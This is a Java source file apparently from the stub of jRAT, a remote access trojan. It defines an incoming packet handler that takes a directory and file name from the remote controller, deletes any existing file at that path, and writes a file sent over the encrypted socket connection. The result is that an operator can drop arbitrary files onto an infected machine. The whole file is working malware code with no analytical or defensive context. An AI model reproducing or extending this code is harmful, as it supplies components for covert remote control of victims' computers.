package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileIO;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;


public class Packet42ClientDownloadFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String destdir = Connection.readLine();
		String filename = Connection.readLine();

		File file = new File(destdir + File.separator + filename);

		if (file.exists() && file.isFile()) {
			file.delete();
		}

		FileIO fileio = new FileIO();
		fileio.readFile(file, Connection.socket, Connection.dis, Connection.dos, null, Main.getKey());
	}

}
